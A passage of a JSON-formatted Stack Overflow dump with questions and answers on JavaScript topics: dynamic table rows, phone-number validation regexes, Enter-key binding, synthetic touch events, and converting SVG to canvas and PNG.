                    "body": "<p>You could just clone the first row that has the inputs, then get the nested inputs and update their ID to add the row number (and do the same with the first cell).</p>\n\n<pre><code>function deleteRow(row)\n{\n    var i=row.parentNode.parentNode.rowIndex;\n    document.getElementById('POITable').deleteRow(i);\n}\n\n\nfunction insRow()\n{\n    var x=document.getElementById('POITable');\n       // deep clone the targeted row\n    var new_row = x.rows[1].cloneNode(true);\n       // get the total number of rows\n    var len = x.rows.length;\n       // set the innerHTML of the first row \n    new_row.cells[0].innerHTML = len;\n\n       // grab the input from the first cell and update its ID and value\n    var inp1 = new_row.cells[1].getElementsByTagName('input')[0];\n    inp1.id += len;\n    inp1.value = '';\n\n       // grab the input from the first cell and update its ID and value\n    var inp2 = new_row.cells[2].getElementsByTagName('input')[0];\n    inp2.id += len;\n    inp2.value = '';\n\n       // append the new row to the table\n    x.appendChild( new_row );\n}\n</code></pre>\n\n<p><strong>Example:</strong> <a href=\"http://jsfiddle.net/7AeDQ/\">http://jsfiddle.net/7AeDQ/</a></p>\n",
                    "is_accepted": true,
                    "score": 9
                },
                {
                    "body": "<p>This can probably help you .\n<a href=\"http://www.mredkj.com/tutorials/tableaddrow.html\" rel=\"nofollow\">http://www.mredkj.com/tutorials/tableaddrow.html</a></p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>This seems a lot cleaner than the answer above...</p>\n\n<pre><code>&lt;script&gt;\nvar maxID = 0;\nfunction getTemplateRow() {\nvar x = document.getElementById(\"templateRow\").cloneNode(true);\nx.id = \"\";\nx.style.display = \"\";\nx.innerHTML = x.innerHTML.replace(/{id}/, ++maxID);\nreturn x;\n}\nfunction addRow() {\nvar t = document.getElementById(\"theTable\");\nvar rows = t.getElementsByTagName(\"tr\");\nvar r = rows[rows.length - 1];\nr.parentNode.insertBefore(getTemplateRow(), r);\n\n}\n&lt;/script&gt;\n\n\n&lt;table id=\"theTable\"&gt;\n&lt;tr&gt;\n&lt;td&gt;id&lt;/td&gt;\n&lt;td&gt;name&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr id=\"templateRow\" style=\"display:none\"&gt;\n&lt;td&gt;{id}&lt;/td&gt;\n&lt;td&gt;&lt;input /&gt;&lt;/td&gt;\n&lt;/tr&gt;\n&lt;/table&gt;\n\n\n&lt;button onclick=\"addRow();\"&gt;Go&lt;/button&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>1 &amp; 2: innerHTML can take HTML as well as text. You could do something like:</p>\n\n<p><code>c1.innerHTML = \"&lt;input size=25 type=\\\"text\\\" id='newID' readonly=true/&gt;\";</code></p>\n\n<p>May or may not be the best way to do it, but you could do it that way.</p>\n\n<p>3: I would just use a global variable that holds the number of POIs and increment/decrement it each time.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<h2>Easy Javascript Add more Rows with delete functionality</h2>\n\n<p>Cheers !</p>\n\n<pre><code>&lt;TABLE id=\"dataTable\"&gt;\n&lt;tr&gt;&lt;td&gt;\n               &lt;INPUT TYPE=submit name=submit id=button class=btn_medium VALUE=\\'Save\\'  &gt;\n               &lt;INPUT type=\"button\" value=\"AddMore\" onclick=\"addRow(\\'dataTable\\')\" class=\"btn_medium\"    /&gt; \n&lt;/td&gt;&lt;/tr&gt;\n\n&lt;TR&gt;\n&lt;TD&gt; \n                &lt;input type=\"text\" size=\"20\" name=\"values[]\"/&gt; &lt;br&gt;&lt;small&gt;&lt;font color=\"gray\"&gt;Enter Title&lt;/font&gt;&lt;/small&gt; \n&lt;/TD&gt;\n&lt;/TR&gt;\n&lt;/table&gt;\n\n\n\n&lt;script&gt;\n\n\nfunction addRow(tableID) {\n\n        var table = document.getElementById(tableID);\n\n        var rowCount = table.rows.length;\n        var row = table.insertRow(rowCount);\n\n        var cell3 = row.insertCell(0);\n       cell3.innerHTML = cell3.innerHTML +' &lt;input type=\"text\" size=\"20\" name=\"values[]\"/&gt; &lt;INPUT type=\"button\"  class=\"btn_medium\" value=\"Remove\" onclick=\"this.parentNode.parentNode.parentNode.removeChild(this.parentNode.parentNode);\" /&gt;&lt;br&gt;&lt;small&gt;&lt;font color=\"gray\"&gt;Enter Title&lt;/font&gt;&lt;/small&gt;';\n  //cell3.innerHTML = cell3.innerHTML +' &lt;input type=\"text\" size=\"20\" name=\"values[]\"/&gt; &lt;INPUT type=\"button\"  class=\"btn_medium\" value=\"Remove\" onclick=\"this.parentNode.parentNode.innerHTML=\\'\\';\" /&gt;&lt;br&gt;&lt;small&gt;&lt;font color=\"gray\"&gt;Enter Title&lt;/font&gt;&lt;/small&gt;';       \n}\n\n&lt;/script&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p><strong>This code may help some one</strong></p>\n\n<pre><code>    &lt;HTML&gt;\n&lt;HEAD&gt;\n    &lt;TITLE&gt; Add/Remove dynamic rows in HTML table &lt;/TITLE&gt;\n    &lt;style type=\"text/css\"&gt;\n        .democlass{\n            color:red;\n        }\n    &lt;/style&gt;\n    &lt;SCRIPT language=\"javascript\"&gt;\n        function addRow(tableID) {\n\n            var table = document.getElementById(tableID);\n            var rowCount = table.rows.length;\n            var colCount = table.rows[0].cells.length;\n\n            var row = table.insertRow(rowCount);\n            for(var i = 0; i &lt; colCount; i++) {\n                var newcell = row.insertCell(i);\n                newcell.innerHTML = table.rows[0].cells[i].innerHTML;\n            }\n\n            row = table.insertRow(table.rows.length);\n            for(var i = 0; i &lt; colCount; i++) {\n                var newcell = row.insertCell(i);\n                newcell.innerHTML = table.rows[1].cells[i].innerHTML;\n            }\n\n            row = table.insertRow(table.rows.length);\n            for(var i = 0; i &lt; colCount; i++) {\n                var newcell = row.insertCell(i);\n                newcell.innerHTML = table.rows[2].cells[i].innerHTML;\n            }\n\n            row = table.insertRow(table.rows.length);\n            for(var i = 0; i &lt; colCount; i++) {\n\n                var newcell = row.insertCell(i);\n                if(i == (colCount - 1)) {\n                    newcell.innerHTML = \"&lt;INPUT type=\\\"button\\\" value=\\\"Delete Row\\\" onclick=\\\"removeRow(this)\\\"/&gt;\";\n                } else {\n                    newcell.innerHTML = table.rows[3].cells[i].innerHTML;\n                }\n            }\n        }\n\n        /**\n         * This method deletes the specified section of the table\n         * OR deletes the specified rows from the table.\n         */\n        function removeRow(src) {\n\n            var oRow = src.parentElement.parentElement;\n            var rowsCount = 0;\n            for(var index = oRow.rowIndex; index &gt;= 0; index--) {\n\n                document.getElementById(\"dataTable\").deleteRow(index);\n                if(rowsCount == (4 - 1)) {\n                    return;\n                }\n                rowsCount++;\n            }\n            //once the row reference is obtained, delete it passing in its rowIndex\n            /* document.getElementById(\"dataTable\").deleteRow(oRow.rowIndex); */\n        }\n    &lt;/SCRIPT&gt;\n&lt;/HEAD&gt;\n&lt;BODY&gt;\n    &lt;form name=\"myForm\"&gt;\n        &lt;TABLE id=\"dataTable\" width=\"350px\" border=\"1\"&gt;\n            &lt;TR&gt;\n                &lt;TD&gt;\n                    &lt;INPUT type=\"checkbox\" name=\"chk\"/&gt;\n                &lt;/TD&gt;\n                &lt;TD&gt;\n                    Code\n                &lt;/TD&gt;\n                &lt;TD&gt;\n                    &lt;INPUT type=\"text\" name=\"txt\"/&gt;\n                &lt;/TD&gt;\n                &lt;TD&gt;\n                    Select Country\n                &lt;/TD&gt;\n                &lt;TD&gt;\n                    &lt;SELECT name=\"country\"&gt;\n                        &lt;OPTION value=\"in\"&gt;India&lt;/OPTION&gt;\n                        &lt;OPTION value=\"de\"&gt;Germany&lt;/OPTION&gt;\n                        &lt;OPTION value=\"fr\"&gt;France&lt;/OPTION&gt;\n                        &lt;OPTION value=\"us\"&gt;United States&lt;/OPTION&gt;\n                        &lt;OPTION value=\"ch\"&gt;Switzerland&lt;/OPTION&gt;\n                    &lt;/SELECT&gt;\n                &lt;/TD&gt;\n            &lt;/TR&gt;\n            &lt;TR&gt;\n                &lt;TD&gt;&amp;nbsp;&lt;/TD&gt;\n                &lt;TD&gt;\n                    First Name\n                &lt;/TD&gt;\n                &lt;TD&gt;\n                    &lt;INPUT type=\"text\" name=\"txt1\"/&gt;\n                &lt;/TD&gt;\n                &lt;TD&gt;\n                    Last Name\n                &lt;/TD&gt;\n                &lt;TD&gt;\n                    &lt;INPUT type=\"text\" name=\"txt2\"/&gt;\n                &lt;/TD&gt;\n            &lt;/TR&gt;\n            &lt;TR&gt;\n                &lt;TD&gt;&amp;nbsp;&lt;/TD&gt;\n                &lt;TD&gt;Phone&lt;/TD&gt;\n                &lt;TD&gt;\n                    &lt;INPUT type=\"text\" name=\"txt3\"/&gt;\n                &lt;/TD&gt;\n                &lt;TD&gt;Address&lt;/TD&gt;\n                &lt;TD&gt;\n                    &lt;INPUT type=\"text\" name=\"txt4\" class=\"democlass\"/&gt;\n                &lt;/TD&gt;\n            &lt;/TR&gt;\n            &lt;TR&gt;\n                &lt;TD&gt;&amp;nbsp;&lt;/TD&gt;\n                &lt;TD&gt;&amp;nbsp;&lt;/TD&gt;\n                &lt;TD&gt;\n                    &amp;nbsp;\n                &lt;/TD&gt;\n                &lt;TD&gt;&amp;nbsp;&lt;/TD&gt;\n                &lt;TD&gt;\n                    &lt;INPUT type=\"button\" value=\"Add Row\" onclick=\"addRow('dataTable')\" /&gt;\n                &lt;/TD&gt;\n            &lt;/TR&gt;\n        &lt;/TABLE&gt;\n&lt;/BODY&gt;\n&lt;/HTML&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I used some of the solutions indicated above plus solutions from other postings to come up with a working solution for a dynamic table containing input fields. I'm doing this because it might help someone who finds this thread after searching for the same things that led me to it, and also because the accepted answer (and associated jsfiddle) doesn't actually work! That is, it doesn't index the table rows correctly after a number of inserts/deletes.  The key issue is how to uniquely index the dynamic row data, which is possible with a bit of jquery:</p>\n\n<pre><code>&lt;form id=frmLines&gt;\n  &lt;table id=tabLines&gt;\n  &lt;tr&gt;\n    &lt;td&gt;img src='/some/suitable/graphic' onclick='removeLine(this);'/&gt;&lt;/td&gt;\n    &lt;td&gt;&lt;input type='text' name='field1' /&gt;&lt;/td&gt;\n    &lt;td&gt;&lt;input type='text' name='field2' /&gt;&lt;/td&gt;\n    &lt;td&gt;&lt;input type='text' name='field3' /&gt;&lt;/td&gt;\n  &lt;/tr&gt;\n  &lt;tr&gt;\n    &lt;td&gt;&lt;img src='/some/suitable/graphic' onclick='addLine();' /&gt;&lt;/td&gt;\n    &lt;td colspan=3&gt;&amp;nbsp;&lt;/td&gt;\n  &lt;/tr&gt;\n  &lt;/table&gt;\n&lt;/form&gt;\n</code></pre>\n\n<p>Note the form and table have id's for direct DOM referencing, but you can't use id's on the input fields as to make them unique you'd need to introduce an index which would massively complicate the code - and its easy enough to access them by name when the form is processed (see below)</p>\n\n<p>Then the javascript to control adding and removing lines is like this:</p>\n\n<pre><code>function addLine() {\n  var tabLines = document.getElementById(\"tabLines\");\n  var tabLinesRow = tabLines.insertRow(tabLines.rows.length-1);\n  var col1html = \"&lt;img src='/some/suitable/graphic' onclick='removeLine(this);'&gt;\";\n  var col2html = \"&lt;input type='text' name='field1' /&gt;\";\n  var col3html = \"&lt;input type='text' name='field2' /&gt;\";\n  var col4html = \"&lt;input type='text' name='field3' /&gt;\";\n\n  var col1 = tabLinesRow.insertCell(0); col1.innerHTML=col1html;\n  var col2 = tabLinesRow.insertCell(1); col2.innerHTML=col2html;\n  var col3 = tabLinesRow.insertCell(2); col3.innerHTML=col3html;\n  var col4 = tabLinesRow.insertCell(3); col4.innerHTML=col4html;\n}\n\nfunction removeLine(lineItem) {\n  var row = lineItem.parentNode.parentNode;\n  row.parentNode.removeChild(row);\n}\n</code></pre>\n\n<p>Then the final part of the jigsaw - the javascript to process the form data when its submitted. The key jquery function here is .eq() - which allows you to access the field names in the order they appear in the form - i.e. in table row order.</p>\n\n<pre><code>var frmData = {};              // an object to contain all form data\nvar arrLines = new Array();    // array to contain the dynamic lines\n\nvar tabLines = document.getElementById(\"tabLines\").rows.length-1;\n\nfor (i=0;i&lt;tabLines;i++) {\n  arrLines[i] = {};\n  arrLines[i]['no']     = i+1;\n  arrLines[i]['field1'] = $(\"#frmLines input[name=field1]\").eq(i).val();\n  arrLines[i]['field2'] = $(\"#frmLines input[name=field2]\").eq(i).val();\n  arrLines[i]['field3'] = $(\"#frmLines input[name=field3]\").eq(i).val();\n}\nfrmData['lines'] = arrLines;\n\nfrmData['another_field'] = $('#frmLines input[name=another_field]\").val();\n\nvar jsonData = JSON.stringify(frmData);\n\n// lines of data now in a JSON structure as indexed array\n// (plus other fields in the JSON as required)\n// ready to post via ajax etc\n</code></pre>\n\n<p>I hope this helps someone, either directly or indirectly. There are a couple of subtle techniques being used which aren't that complicated but took me 3-4 hours to piece together.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>If you put a delete button on each row, then:</p>\n\n<pre><code>&lt;tr&gt;\n  &lt;td&gt;&lt;input type=\"button\" value=\"Delete row\" onclick=\"deleteRow(this);\"&gt;\n  &lt;td&gt;&lt;input type=\"text\"&gt;\n  &lt;td&gt;&lt;input type=\"text\"&gt;\n</code></pre>\n\n<p>And the deleteRow function can be:</p>\n\n<pre><code>function deleteRow(el) {\n    // while there are parents, keep going until reach TR \n    while (el.parentNode &amp;&amp; el.tagName.toLowerCase() != 'tr') {\n        el = el.parentNode;\n    }\n\n    // If el has a parentNode it must be a TR, so delete it\n    // Don't delte if only 3 rows left in table\n    if (el.parentNode &amp;&amp; el.parentNode.rows.length &gt; 3) {\n        el.parentNode.removeChild(el);\n    }\n}\n</code></pre>\n\n<p>If all your rows have the same content, it will be much faster to add a row by cloning an existing row:</p>\n\n<pre><code>function addRow(tableID) {\n    var table = document.getElementById(tableID);\n\n    if (!table) return;\n\n    var newRow = table.rows[1].cloneNode(true);\n\n    // Now get the inputs and modify their names \n    var inputs = newRow.getElementsByTagName('input');\n\n    for (var i=0, iLen=inputs.length; i&lt;iLen; i++) {\n        // Update inputs[i]\n    }\n\n    // Add the new row to the tBody (required for IE)\n    var tBody = table.tBodies[0];\n    tBody.insertBefore(newRow, tBody.lastChild);\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>I'm trying to add/delete table rows following <a href=\"http://www.w3schools.com/js/tryit.asp?filename=try_dom_table_insertrow\">this example </a> and <a href=\"http://www.w3schools.com/js/tryit.asp?filename=try_dom_table_deleterow\"> this example</a>.    </p>\n\n<p>Here's my code - </p>\n\n<p><strong>HTML Form</strong></p>\n\n<pre><code>&lt;div id=\"POItablediv\"&gt;\n    &lt;input type=\"button\" id=\"addPOIbutton\" value=\"Add POIs\"/&gt;&lt;br/&gt;&lt;br/&gt;\n    &lt;table id=\"POITable\" border=\"1\"&gt;\n        &lt;tr&gt;\n            &lt;td&gt;POI&lt;/td&gt;\n            &lt;td&gt;Latitude&lt;/td&gt;\n            &lt;td&gt;Longitude&lt;/td&gt;\n            &lt;td&gt;Delete?&lt;/td&gt;\n            &lt;td&gt;Add Rows?&lt;/td&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n            &lt;td&gt;1&lt;/td&gt;\n            &lt;td&gt;&lt;input size=25 type=\"text\" id=\"latbox\" readonly=true/&gt;&lt;/td&gt;\n            &lt;td&gt;&lt;input size=25 type=\"text\" id=\"lngbox\" readonly=true/&gt;&lt;/td&gt;\n            &lt;td&gt;&lt;input type=\"button\" id=\"delPOIbutton\" value=\"Delete\" onclick=\"deleteRow(this)\"/&gt;&lt;/td&gt;\n            &lt;td&gt;&lt;input type=\"button\" id=\"addmorePOIbutton\" value=\"Add More POIs\" onclick=\"insRow()\"/&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n    &lt;/table&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p><strong>JavaScript</strong></p>\n\n<pre><code>function deleteRow(row)\n{\n    var i=row.parentNode.parentNode.rowIndex;\n    document.getElementById('POITable').deleteRow(i);\n}\n\n\nfunction insRow()\n{\n    var x=document.getElementById('POITable').insertRow(1);\n    var c1=x.insertCell(0);\n    var c2=x.insertCell(1);\n    c1.innerHTML=\"NEW CELL1\";\n    c2.innerHTML=\"NEW CELL2\";\n}\n</code></pre>\n\n<p>Now, as you can see, In my table I have text fields and buttons. What I want - </p>\n\n<ol>\n<li><p>Just to repeat the structure of the row. I can't do it right now since innerHTM just takes texts. How can I insert a textfield or label?</p></li>\n<li><p>The ids of the textfields should also be different since I'll retrieve the values later to put it in a database.</p></li>\n<li><p>I want to put a function to increment the number of POIs as well</p></li>\n</ol>\n\n<p>Can anyone help me out please?  </p>\n",
            "last_activity_date": 1401106888,
            "question_id": 6473111,
            "score": 7,
            "tags": [
                "javascript",
                "html"
            ],
            "title": "Add/Delete Table rows Dynamically Javascript"
        },
        {
            "answer_count": 6,
            "answers": [
                {
                    "body": "<p>Something like this:</p>\n\n<pre><code>\\d{3}-\\d{3}-\\d{4}|\\d{10}\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 12
                },
                {
                    "body": "<p>While general phone number validation is a larger problem than what you're trying to solve, I'd do the following:</p>\n\n<pre><code>var targ=phone_number_to_validate.replace(/[^\\d]/g,''); // remove all non-digits\nif(targ &amp;&amp; targ.length===10) {\n  // targ is a valid phone number\n}\n</code></pre>\n\n<p>Doing it this way will validate all of the following forms:</p>\n\n<pre><code>xxxxxxxxxx\nxxx-xxx-xxxx\n(xxx) xxx-xxxx\netc.\n</code></pre>\n\n<p>Also, to trivially check for a valid U.S. area code, you can use:</p>\n\n<pre><code>if(targ.matches(/^[2-9]\\d{2}/)) // targ is a valid area code\n</code></pre>\n\n<p>Again, this is a trivial check. For something a little more rigorous, see this <a href=\"http://www.bennetyee.org/ucsd-pages/area.html\">List of Legal US Area Codes</a>.</p>\n\n<p>See also <a href=\"http://stackoverflow.com/questions/123559/a-comprehensive-regex-for-phone-number-validation\">A comprehensive regex for phone number validation</a></p>\n",
                    "is_accepted": false,
                    "score": 9
                },
                {
                    "body": "<pre><code>var rx=/^\\d{3}\\-?\\d{3}\\-?\\d{4}$/;\nif(rx.test(string)){\n//10 diget number with possible area and exhange hyphens\n}\nelse //not\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>The following regular expression can be used to validate defined and operational (as of 6/2011) telephone area codes within the U.S.:</p>\n\n<pre><code>var area_code_RE=\n '(2(?:0[1-35-9]|1[02-9]|2[4589]|3[1469]|4[08]|5[1-46]|6[0279]|7[068]|8[13])'+\n '|3(?:0[1-57-9]|1[02-9]|2[0139]|3[014679]|47|5[12]|6[019]|8[056])'+\n '|4(?:0[126-9]|1[02-579]|2[3-5]|3[0245]|4[023]|6[49]|7[0589]|8[04])'+\n '|5(?:0[1-57-9]|1[0235-8]|[23]0|4[01]|5[179]|6[1-47]|7[01234]|8[056])'+\n '|6(?:0[1-35-9]|1[024-9]|2[0368]|3[016]|4[16]|5[01]|6[012]|7[89]|8[29])'+\n '|7(?:0[1-4678]|1[2-9]|2[047]|3[1247]|4[07]|5[47]|6[02359]|7[02-59]|8[156])'+\n '|8(?:0[1-8]|1[02-8]|28|3[0-25]|4[3578]|5[06-9]|6[02-5]|7[028])'+\n '|9(?:0[1346-9]|1[02-9]|2[0578]|3[15679]|4[0179]|5[124679]|7[1-35689]|8[0459])'+\n ')';\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Not sure if this helps but <a href=\"http://www.phoneformat.com/\" rel=\"nofollow\">PhoneFormat.com</a> has a javascript library that can help you with formatting and validation.  </p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p><strong>Use this :</strong></p>\n\n<p>/^(1-?)?(([2-9]\\d{2})|[2-9]\\d{2})-?[2-9]\\d{2}-?\\d{4}$/</p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>I want users to allow only phone numbers in following format </p>\n\n<p>xxx-xxx-xxxx or xxxxxxxxxx all digits only . Can some one suggest a regular expression to do this ?</p>\n",
            "last_activity_date": 1347538600,
            "question_id": 6195458,
            "score": 7,
            "tags": [
                "javascript",
                "regex",
                "validation",
                "string"
            ],
            "title": "Phone Number Validation Javascript"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<pre><code>$(\"#post\").focus(function() {\n    $(this).data(\"hasfocus\", true);\n});\n\n$(\"#post\").blur(function() {\n    $(this).data(\"hasfocus\", false);\n});\n\n$(document.body).keyup(function(ev) {\n    // 13 is ENTER\n    if (ev.which === 13 &amp;&amp; $(\"#post\").data(\"hasfocus\")) {\n        ...\n    }\n});\n</code></pre>\n\n<p>I recommend you instead bind the the ENTER keyup event on your <code>$(\"#post\")</code> input directly rather then listening for the event on the entire page.</p>\n",
                    "is_accepted": true,
                    "score": 16
                },
                {
                    "body": "<p>Just bind the onkeyup event to the input in question. You don't need to worry about checking focus at all, because by definition that input will only receive keyup events when it has focus.</p>\n\n<p>I assume JQuery is OK since you included the tag in your question, so within your document ready handler do something like this:</p>\n\n<pre><code>$(\"#IDforyourcontrol\").keyup(function(ev) {\n   // 13 is ENTER\n   if (ev.which === 13 &amp;&amp; /*whatever other conditions you care about*/) {\n      // do something\n   }\n}); \n</code></pre>\n",
                    "is_accepted": false,
                    "score": 10
                }
            ],
            "body": "<p>I need to bind the 'enter' key on the keyboard to a specific javascript method, but ONLY when a certain text field is in focus.</p>\n\n<pre><code>&lt;input id=\"post\" type=\"text\" style=\"width:400px;\"/&gt;\n</code></pre>\n\n<p>How would I do this?</p>\n\n<p>I know you can do it with forms and stuff that have a submit action, but can I just bind the 'enter' key to a specific function when this above <code>input</code> field is in focus? </p>\n",
            "last_activity_date": 1304988704,
            "question_id": 5943954,
            "score": 7,
            "tags": [
                "javascript",
                "jquery",
                "html"
            ],
            "title": "Bind textbox to &#39;enter&#39; key"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>According to <a href=\"https://dvcs.w3.org/hg/webevents/raw-file/tip/touchevents.html\">w3c touch spec</a>, <code>TouchEvent</code> is a subclass of UIEvent. Try creating it like:</p>\n\n<pre><code>var evt = document.createEvent('TouchEvent');\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 8
                },
                {
                    "body": "<p>change:</p>\n\n<pre><code>evt.initTouchEvent('touchstart', true, true);\n</code></pre>\n\n<p>to:</p>\n\n<pre><code>evt.initUIEvent('touchstart', true, true);\n</code></pre>\n\n<p>worked for me with nightly chrome build</p>\n",
                    "is_accepted": false,
                    "score": 5
                }
            ],
            "body": "<p>I am trying to fire touch events in my javascript to simulate user interactions for the purpose of testing features. I have tried the following snippet:</p>\n\n<pre><code>try {\n    var targetElement = document.elementFromPoint(55, 155);\n    console.log(targetElement);\n    var evt = document.createEvent('UIEvent');\n    evt.initTouchEvent('touchstart', true, true);\n\n    evt.view = window;\n    evt.altKey = false;\n    evt.ctrlKey = false;\n    evt.shiftKey = false;\n    evt.metaKey = false;\n\n    targetElement.dispatchEvent(evt);\n} catch (except){\n    alert(except);\n}\n</code></pre>\n\n<p>The above code throws the exception 'TypeError: Result of expression 'evt.initTouchEvent[undefined]' is not a function.'</p>\n\n<p>Can somebody point out what I'm doing wrong?</p>\n",
            "last_activity_date": 1381919327,
            "question_id": 5713393,
            "score": 7,
            "tags": [
                "javascript",
                "javascript-events"
            ],
            "title": "Creating and firing touch events on a touch enabled browser?"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>When a web browser loads an SVG file, it (roughly) parses the stream of bytes and creates a DOM structure <em>in memory</em> for the SVG file. It is this in-memory representation that is modified when script dynamically creates and appends new elements to the document.</p>\n\n<p>You can see a very simple example of this here:<br>\n<a href=\"http://phrogz.net/svg/svg_in_xhtml5.xhtml\">http://phrogz.net/svg/svg_in_xhtml5.xhtml</a><br>\nThe SVG file loads with a circle in the background for the face, and then JavaScript dynamically creates the eyes and nose and appends them as children of the SVG element.</p>\n\n<p>There are three ways I know of that you can access this information and get it into a canvas:</p>\n\n<ol>\n<li><p>You can walk the DOM of elements yourself, and issue canvas context drawing commands:</p>\n\n<pre><code>var svg = document.getElementsByTagName('svg')[0];\nvar kids = svg.childNodes;\nfor (var i=0,len=kids.length;i&lt;len;++i){\n  var kid = kids[i];\n  if (kid.nodeType!=1) continue; // skip anything that isn't an element\n  switch(kid.nodeName){\n    case 'circle':\n      // ...\n    break;\n    case 'path':\n      // ...\n    break;\n    // ...\n  }\n}\n</code></pre>\n\n<p>See the <a href=\"http://www.w3.org/TR/SVG/svgdom.html\">SVG DOM reference</a> for more information on the properties and methods available to you, or just use the <a href=\"http://www.w3.org/TR/DOM-Level-2-Core/\">DOM 2 Core</a> methods to fetch properties. For simplicity, you might want to use the latter.</p>\n\n<p>For example, you can either access the current (non-SMIL animated) <code>cx</code> of the circle using the SVG DOM via <code>var cx = kid.cx.baseVal.value;</code> or you can more simply do <code>var cx = kid.getAttribute('cx');</code>.</p>\n\n<p>This is going to be simple where SVG and Canvas have similar commands (e.g. <code>rect</code> or <code>line</code>), a little bit of work where they don't match exactly (e.g. <code>circle</code> versus <code>arcTo</code>, <code>polyline</code> as a series of <code>lineTo</code> commands), and a lot of work for the <code>path</code> element and its <a href=\"http://www.w3.org/TR/SVG/paths.html\">many drawing commands</a>.</p></li>\n<li><p>Per <a href=\"http://stackoverflow.com/questions/227208/what-is-the-best-way-to-serialize-svg-from-the-client-dom/227754#227754\">this answer</a> and <a href=\"http://www.svgopen.org/2010/papers/62-From_SVG_to_Canvas_and_Back/index.html#svg_to_canvas\">this paper</a>, use the <code>XMLSerializer</code> interface to get the SVG back as markup, use that directly as the source of an <code>img</code>, and then <code>drawImage</code> that to the canvas. Using my above example:</p>\n\n<pre><code>var svg_xml = (new XMLSerializer).serializeToString(svg);\nconsole.log(svg_xml);\n// \"&lt;svg xmlns=\"http://www.w3.org/2000/svg\" version=\"1.1\" baseProfile=\"full\" viewBox=\"-350 -250 700 500\"&gt;\n// &lt;circle r=\"200\" class=\"face\" fill=\"red\"/&gt;\n// &lt;path fill=\"none\" class=\"face\" transform=\"translate(-396,-230)\" d=\"M487.41,282.411c-15.07,36.137-50.735,61.537-92.333,61.537         c-41.421,0-76.961-25.185-92.142-61.076\"/&gt;\n// &lt;circle cx=\"-60\" cy=\"-50\" r=\"20\" fill=\"#000\"/&gt;\n// &lt;circle cx=\"60\" cy=\"-50\" r=\"20\" fill=\"#000\"/&gt;\n// &lt;/svg&gt;\"\nvar ctx = myCanvas.getContext('2d');\nvar img = new Image;\nimg.onload = function(){ ctx.drawImage(img,0,0); };\nimg.src = \"data:image/svg+xml;base64,\"+btoa(svg_xml);\n</code></pre>\n\n<p>If you have SVG in XHTML (as in my example), the serialization will not capture styles defined outside of the SVG block (as in my example) and so they will not be applied in the image.</p>\n\n<p>Note that per <a href=\"http://stackoverflow.com/questions/4776670/should-setting-an-image-src-to-dataurl-be-available-immediately/4807114#4807114\">this question/answer</a> (mine), you must set the <code>onload</code> attribute <em>before</em> you set the <code>src</code> to the data URL if you want IE9 compatibility.</p>\n\n<p>Unfortunately, due to what may or may not be <a href=\"https://bugs.webkit.org/show_bug.cgi?id=29305\">a bug</a>, drawing a data-url image to a canvas causes the origin-clean flag to be set to <code>false</code>, which means that you will not be able to call <code>toDataURL()</code> on the canvas and get your PNG back. So...</p></li>\n<li><p>I suppose for your specific needs of Client-modified SVG->Canvas->PNG-on-server you will need to use the first step above to serialize the <code>svg_xml</code> and then pass that raw source to <a href=\"http://code.google.com/p/canvg/\">canvg</a>.</p></li>\n</ol>\n\n<p>Alternatively, you might consider serializing the SVG per the above and submitting that directly to your server and doing <a href=\"http://www.google.com/search?q=svg+to+png\">server-side SVG-to-PNG conversion</a>.</p>\n",
                    "is_accepted": false,
                    "score": 15
                },
                {
                    "body": "<p>The webkit bug mentioned in @Phrogz answer seems to have been fixed in more recent versions, so I found a solution that doesn't require a manual parse is</p>\n\n<pre><code>// from http://bl.ocks.org/biovisualize/1209499\n// via https://groups.google.com/forum/?fromgroups=#!topic/d3-js/RnORDkLeS-Q\nvar xml = d3.select(\"svg\")\n  .attr(\"title\", \"test2\")\n  .attr(\"version\", 1.1)\n  .attr(\"xmlns\", \"http://www.w3.org/2000/svg\")\n  .node().parentNode.innerHTML;\n\n// from http://webcache.googleusercontent.com/search?q=cache:http://phpepe.com/2012/07/export-raphael-graphic-to-image.html\n// via http://stackoverflow.com/questions/4216927/problem-saving-as-png-a-svg-generated-by-raphael-js-in-a-canvas\nvar canvas = document.getElementById(\"myCanvas\")\ncanvg(canvas, svgfix(xml));\ndocument.location.href = canvas.toDataURL();\n</code></pre>\n\n<p>which requires \n<a href=\"https://code.google.com/p/svgfix/\" rel=\"nofollow\">https://code.google.com/p/svgfix/</a> and <a href=\"https://code.google.com/p/canvg/\" rel=\"nofollow\">https://code.google.com/p/canvg/</a> and uses d3.js to obtain the svg source, which should be doable without d3.js as well (but this takes care of adding required metadata which can lead to problems when missing).</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I am working on a web application using SVG &amp; JS. Things are going well but I am a bit confused by data handling.</p>\n\n<p>The data for objects that users create is dynamically appended to the SVG root. Where &amp; how is this SVG data stored, &amp; how can I access it? The reason I want to read it is that I want to convert this SVG data into HTML5 canvas (using Google's <a href=\"http://code.google.com/p/canvg/\">canvg</a>) and finally turn that into a png image to be stored in our db for reference.</p>\n\n<p>Any guidance would be much appreciated.</p>\n",
            "last_activity_date": 1363396685,
            "question_id": 5201782,
            "score": 7,
            "tags": [
                "javascript",
                "html5",
                "canvas",
                "svg"
            ],
            "title": "Accessing the SVG data through JavaScript"
        },
        {
